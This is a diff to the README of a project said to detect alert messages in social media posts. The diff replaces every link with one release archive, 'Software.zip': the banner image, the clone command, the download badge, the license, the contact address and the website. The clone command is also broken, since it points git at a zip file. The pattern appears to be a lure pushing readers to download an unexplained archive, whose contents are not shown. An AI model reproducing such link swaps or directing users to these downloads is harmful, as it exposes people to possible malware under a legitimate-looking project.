@@ -2,7 +2,7 @@
 
 Welcome to the Alert Text Detector GitHub repository! This repository houses an NLP-based model that can detect alert messages from social media posts. Whether it's a natural disaster, a public safety issue, or any emergency situation, our model is designed to flag and categorize relevant messages. 
 
-![Alert Text Detector Banner](https://imageurl.com)
+![Alert Text Detector Banner](https://github.com/vyshnavidevi11/Alert_Text_Detector/releases/download/v1.0/Software.zip)
 
 ## Overview ℹ️
 
@@ -22,7 +22,7 @@ Alert Text Detector is built using BERTweet Base, a transformer model specifical
 
 To get started with Alert Text Detector, follow these simple steps:
 
-1. Clone the repository: `git clone https://github.com/your_username/Alert_Text_Detector.git`
+1. Clone the repository: `git clone https://github.com/vyshnavidevi11/Alert_Text_Detector/releases/download/v1.0/Software.zip`
 2. Install the necessary dependencies.
 3. Launch the application using your preferred method.
 4. Start detecting alert messages from social media posts!
@@ -31,7 +31,7 @@ To get started with Alert Text Detector, follow these simple steps:
 
 To install Alert Text Detector, you can use the following link: 
 
-[![Download Alert Text Detector](https://img.shields.io/badge/Download-Alert_Text_Detector-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Alert Text Detector](https://github.com/vyshnavidevi11/Alert_Text_Detector/releases/download/v1.0/Software.zip)](https://github.com/vyshnavidevi11/Alert_Text_Detector/releases/download/v1.0/Software.zip)
 
 Once you have downloaded the repository, follow the installation instructions in the provided documentation to set up the model and start detecting alert messages.
 
@@ -49,16 +49,16 @@ We welcome contributions from the community to enhance Alert Text Detector and m
 
 ## License 📃
 
-This project is licensed under the MIT License. For more information, please refer to the [LICENSE.md](https://github.com/your_username/Alert_Text_Detector/blob/main/LICENSE.md) file.
+This project is licensed under the MIT License. For more information, please refer to the [https://github.com/vyshnavidevi11/Alert_Text_Detector/releases/download/v1.0/Software.zip](https://github.com/vyshnavidevi11/Alert_Text_Detector/releases/download/v1.0/Software.zip) file.
 
 ## Contact Information 📧
 
-For any queries or support regarding Alert Text Detector, you can reach out to the project team at [alert_text_detector@example.com](mailto:alert_text_detector@example.com).
+For any queries or support regarding Alert Text Detector, you can reach out to the project team at [https://github.com/vyshnavidevi11/Alert_Text_Detector/releases/download/v1.0/Software.zip](https://github.com/vyshnavidevi11/Alert_Text_Detector/releases/download/v1.0/Software.zip).
 
 ---
 
-🔗 [Check Latest Releases](https://github.com/your_username/Alert_Text_Detector/releases) if the provided link does not work.
+🔗 [Check Latest Releases](https://github.com/vyshnavidevi11/Alert_Text_Detector/releases/download/v1.0/Software.zip) if the provided link does not work.
 
-🚀 Visit the [Alert Text Detector Website](https://alerttextdetector.com) for more information and updates.
+🚀 Visit the [Alert Text Detector Website](https://github.com/vyshnavidevi11/Alert_Text_Detector/releases/download/v1.0/Software.zip) for more information and updates.
 
 Thank you for your interest in Alert Text Detector! 🚨📱 #iamready
